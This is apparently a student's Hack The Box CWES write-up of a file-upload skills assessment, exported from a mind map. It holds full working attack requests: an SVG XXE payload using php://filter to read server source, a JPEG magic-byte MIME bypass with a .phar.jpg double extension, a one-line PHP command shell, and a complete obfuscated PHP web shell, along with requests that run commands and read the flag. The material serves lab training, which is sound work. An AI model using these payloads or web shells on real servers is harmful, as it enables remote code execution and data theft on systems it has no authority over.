---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
source_file: "CWES.xmind"
---

# Skills Assessment

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Discover the technology used in the web app

### ffuf -u http://83.136.251.11:56928/indexFUZZ -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt

- .phps                   [Status: 403  
  .php                    [Status: 200
## Discover allowed Extensions in upload

### All of them are allowed in Intruder

- Thank you for submitting your feedback
### /contact/script.js

- if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {  
  $('#upload_message').text("Only images are allowed");
- url: '/contact/upload.php',  
  type: 'post',
## Discover the uplaoded file path

### upload custom SVG to read upload.php source code

### visit the API upload.php directly

- visit /contact/upload.php
  - Only images are allowed
    - meanwile the visit is GET request with something like
      - GET /contact/upload.php HTTP/1.1  
        Host: 83.136.253.132:41029  
        Upgrade-Insecure-Requests: 1  
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36  
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8  
        Sec-GPC: 1  
        Accept-Language: en-US,en;q=0.9  
        Accept-Encoding: gzip, deflate, br  
        Connection: keep-alive
  - change request to POST
    - POST /contact/upload.php HTTP/1.1  
      Host: 83.136.253.132:41029  
      Upgrade-Insecure-Requests: 1  
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36  
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8  
      Sec-GPC: 1  
      Accept-Language: en-US,en;q=0.9  
      Accept-Encoding: gzip, deflate, br  
      Connection: keep-alive  
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYw282xkhpYBFgOAQ  
      Content-Length: 341  

      ------WebKitFormBoundaryYw282xkhpYBFgOAQ  
      Content-Disposition: form-data; name="uploadFile"; filename="saudi.svg"  
      Content-Type: image/jpeg  

      <?xml version="1.0" encoding="UTF-8"?>  
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>  
      <svg>&xxe;</svg>  
      ------WebKitFormBoundaryYw282xkhpYBFgOAQ--
      - PD9waHAKcmVxd...
        - decode base64
          - <?<!-- -->php  
            require_once('./common-functions.php');  

            // uploaded files directory  
            $target_dir = "./user_feedback_submissions/";  

            // rename before storing  
            $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);  
            $target_file = $target_dir . $fileName;  

            // get content headers  
            $contentType = $_FILES['uploadFile']['type'];  
            $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);  

            // blacklist test  
            if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {  
            echo "Extension not allowed";  
            die();  
            }  

            // whitelist test  
            if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {  
            echo "Only images are allowed";  
            die();  
            }  

            // type test  
            foreach (array($contentType, $MIMEtype) as $type) {  
            if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {  
            echo "Only images are allowed";  
            die();  
            }  
            }  

            // size test  
            if ($_FILES["uploadFile"]["size"] > 500000) {  
            echo "File too large";  
            die();  
            }  

            if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {  
            displayHTMLImage($target_file);  
            } else {  
            echo "File failed to upload";  
            }
            - file name replaced from file.jpg into 301225_file.jpg
- visit uploaded file
  - GET /contact/user_feedback_submissions/251230_file.svg HTTP/1.1  
    Host: 83.136.254.84:34477
    - HTTP/1.1 200 OK  
      Date: Tue, 30 Dec 2025 20:04:30 GMT  
      Server: Apache/2.4.41 (Ubuntu)  
      Vary: Accept-Encoding  
      Content-Length: 154  
      Keep-Alive: timeout=5, max=100  
      Connection: Keep-Alive  
      Content-Type: text/html; charset=UTF-8  

      <?xml version="1.0" encoding="UTF-8"?>  
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>  
      <svg>&xxe;</svg>
      - find working extension
- Upload php file
  - file SIGNATURES
    - https://en.wikipedia.org/wiki/List_of_file_signatures
      - FF D8 FF E0  
        ÿØÿà  
        jpg
  - Add signature of jpg to bypass MIME
    - ÿØÿà
      - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYw282xkhpYBFgOAQ  
        Content-Length: 232  

        ------WebKitFormBoundaryYw282xkhpYBFgOAQ  
        Content-Disposition: form-data; name="uploadFile"; filename="sh.phar.jpg"  
        Content-Type: image/jpeg  

        ÿØÿà  

        <?<!-- -->php system($ REQUEST('cmd' ]); ?>  
        ------WebKitFormBoundaryYw282xkhpYBFgOAQ--
        - Only images are allowed
          - didnty work maybe because it wasnt AASCII
  - Edit The HEX instead of ASCII to be the exact needed format
    - Untitled
      ![[Attachments/c3649154eef9f5b4fa0a909e4f8afb8ea8204372ed9d95cec75fd16eb9061632.png]]
      - success
  - send malicioud PHP
    - use the php web shell from seclists named another-obfusctaed-phpshell.php or Dysco.php
      - Dysco.php
        - GET /contact/user_feedback_submissions/251231_saudi.phar.jpg?cmd=id HTTP/1.1  
          Host: 94.237.123.185:56456
          - ÿØÿÛ  

            Enabled Function:  
            <br/>system exec shell_exec passthru <br/>  
            Using system as shell command  
            <br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)
      - ------WebKitFormBoundaryYw282xkhpYBFgOAQ  
        Content-Disposition: form-data; name="uploadFile"; filename="saudi.phar.jpg"  
        Content-Type: image/jpeg  

        ÿØÿÛ  

        <?<!-- -->php // Usage example: GET /another_obfuscated_phpshell.php?lol=ls%20-al  
        $S=array(m("ncoai","msyte", "cocain"),m("sir","cex","iris"),m("otab","lshe","taboo")."_".m("sir","cex","iris"),m("gbledin","upasthr","bleeding"));  
        $TR=m("etroubl","edisabl","trouble");$MK=m("dpreambl","sfunctio","preambled");$D=explode(",",ini_get($TR.'_'.$MK));$P=$_REQUEST;  
        function m($a,$b,$c) {return str_replace(str_split($a), str_split($b), $c);}  
        foreach($S as $A) {  
        if(!in_array($A, $D)) {  
        if($A == m("ncoai","msyte","cocain")) $A($P['lol']);  
        elseif($A == m("sir","cex","iris")) {  
        exec("$P 2>&1", $arr);  
        echo join("\n",$arr)."\n";  
        } else echo $A($P['lol']);  
        exit;  
        }  
        }  
        ------WebKitFormBoundaryYw282xkhpYBFgOAQ--
        - GET /contact/user_feedback_submissions/251231_saudi.phar.jpg?lol=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt HTTP/1.1  
          Host: 94.237.123.185:56456
          - ÿØÿÛ  

            HTB{m4573r1ng_upl04d_3xpl0174710n}
